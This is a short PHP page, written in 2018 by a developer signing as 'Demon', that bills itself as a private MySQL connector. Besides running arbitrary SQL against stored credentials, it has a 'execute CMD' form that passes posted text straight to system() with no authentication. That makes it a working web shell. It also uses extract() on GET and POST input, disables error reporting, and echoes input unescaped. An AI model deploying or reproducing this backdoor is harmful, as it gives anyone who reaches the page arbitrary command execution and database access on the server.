<?php
#
#  作者：Demon
#  时间：2018-1-13
#  联系：demonxian3@qq.com
#  博客：http://www.cnblogs.com/demonxian3
#  功能：Mysql数据库连接，执行SQL语句
#
session_start();
error_reporting(0);
extract($_GET);
extract($_POST);

$host = isset($_SESSION['myhostname'])?$_SESSION['myhostname']:"localhost";
$user = isset($_SESSION['myusername'])?$_SESSION['myusername']:"root";
$pass = isset($_SESSION['mypassword'])?$_SESSION['mypassword']:"";
$base = isset($_SESSION['mydatabase'])?$_SESSION['mydatabase']:"mysql";
$iscon = isset($_SESSION['isconnected'])?"数据库连接成功":"数据库尚未连接";

?>


<meta http-equiv="content-type" content="text/html;charset=gb2312">
<title>Mysql连接器 - Demon</title>
<body>
<h1>DEMON专用Mysql连接器</h1><hr>

<form method='post' action=''>
<table>
<tr><td>HOST: </td><td><input id="host" name="my_hostname" value="<?php echo $host;?>" onclick="this.value=''" ></td></tr>
<tr><td>USER: </td><td><input id="user" name="my_username" value="<?php echo $user;?>" onclick="this.value=''" ></td></tr>
<tr><td>PASS: </td><td><input id="pass" name="my_password" value="<?php echo $pass;?>" onclick="this.value=''" ></td></tr>
<tr><td>BASE: </td><td><input id="base" name="my_database" value="<?php echo $base;?>" onclick="this.value=''" ></td></tr>
<input type="hidden" name="sqlcon" value="true">
</table>
<input id="subm" type="submit" value="连接数据库" style="width:200px;cursor:pointer"/>
</form>

<br><br>
执行SQL语句<hr>
<form action='' method='post' style="z-index:3">
<textarea style="width:600px;height:250px;" name="SQL"><?php if(isset($SQL))echo $SQL;?></textarea>
<input type="submit" value="提交">
</form>
<div style="width:600px;border:1px solid #c3c3c3;">
<?php
if(isset($SQL)){

     #$SQL = addslashes($SQL);
     if(!($conn = mysql_connect($host,$user,$pass)))echo mysql_error();
     
     mysql_select_db($base);

     echo "你执行的SQL语句是：".$SQL."<br>";

     $res = mysql_query($SQL);
     if(!$res)echo mysql_error();

     while($row = mysql_fetch_assoc($res)){
       
       foreach($row as $key => $value){
          echo "$value <br>";
       }
     }

     mysql_close();
}
?>
</div>

<?php

if(!isset($my_hostname))$my_hostname = 'localhost';
if(!isset($my_username))$my_username = 'root';
if(!isset($my_password))$my_password = '';
if(!isset($my_database))$my_database = 'mysql';

if($sqlcon){
  if(!($conn = mysql_connect($my_hostname,$my_username,$my_password)))echo mysql_error();
  $_SESSION['myhostname'] = $my_hostname;
  $_SESSION['myusername'] = $my_username;
  $_SESSION['mypassword'] = $my_password;
  $_SESSION['mydatabase'] = $my_database;
  $_SESSION['isconnected'] = "yes";
  echo "<p style='color:red'>数据库连接成功</p>";
  mysql_close();
}
?>



<br><br>
执行CMD语句<hr>
<form action='' method='post' style="z-index:3">
<textarea style="width:600px;height:250px;" name="CMD">
<?php if(isset($CMD))echo $CMD;?>
</textarea>
<input type="submit" value="提交">
</form>
<div style="width:600px;border:1px solid #c3c3c3;">
<?php
if(isset($CMD)){
   echo "<pre>";
   $res = system($CMD);
   if($res)echo "-------命令执行成功<br>";
   echo "</pre>";
}
?>
</div>



